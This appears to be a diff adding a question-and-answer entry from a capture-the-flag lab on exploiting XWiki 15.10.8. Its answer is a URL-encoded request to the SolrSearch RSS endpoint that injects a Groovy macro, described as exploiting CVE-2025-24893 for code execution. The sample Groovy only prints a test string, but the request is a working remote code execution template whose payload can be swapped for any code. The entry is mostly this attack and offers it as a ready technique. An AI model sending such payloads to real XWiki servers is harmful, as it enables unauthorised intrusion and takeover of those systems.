@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+What steps should you take to exploit a vulnerability in XWiki's Solr search?
+
+CONTEXT:
+You have identified that XWiki is running version 15.10.8.
+
+METHOD / ANSWER:
+Command: `http://wiki.editor.htb/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D`
+Explanation: This sends a request that exploits CVE-2025-24893 to execute Groovy code and verify vulnerability.
